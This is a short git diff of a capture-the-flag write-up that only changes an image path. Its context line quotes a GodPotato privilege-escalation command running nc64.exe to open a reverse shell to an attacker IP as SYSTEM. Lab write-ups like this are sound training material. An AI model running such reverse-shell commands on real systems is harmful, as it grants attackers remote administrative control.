@@ -423,7 +423,7 @@ C:\Windows\Tasks>.\god.exe -cmd "c:\windows\tasks\nc64.exe 10.8.2.86 9002 -e cmd
 
 After running `GodPotato`, we get another connection back to our machine as `nt authority\system`. 
 
-![](../../assets/img/posts/data/Pasted%20image%2020240621164514.png)
+![](assets/img/posts/data/Pasted%20image%2020240621164514.png)
 
 Now we can grab the root flag and finish the box! 
 
